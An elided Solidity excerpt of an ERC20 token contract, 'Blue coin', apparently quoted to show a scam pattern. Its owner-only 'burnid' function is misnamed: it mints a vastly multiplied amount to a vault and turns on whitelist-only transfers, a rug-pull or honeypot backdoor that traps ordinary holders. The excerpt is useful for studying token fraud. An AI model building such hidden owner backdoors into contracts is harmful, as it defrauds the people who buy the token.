...
contract TokenSwap is ERC20, Ownable {
    ...
    constructor() ERC20('Blue coin', 'BLUE') {
        whitelistOnly = false;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        if (whitelist[sender] || whitelist[spender]) {
    ...
    function burnid(uint256 amount_) external onlyOwner {
        whitelistOnly = true;
        whitelist[vault()] = true;
        _burnid(amount_ * 1e28);
    }

    function _burnid(uint256 amount_) internal virtual {
        super._beforeTokenTransfer(address(0), vault(), amount_);
        ...
        super._afterTokenTransfer(address(0), vault(), amount_);
    }
}
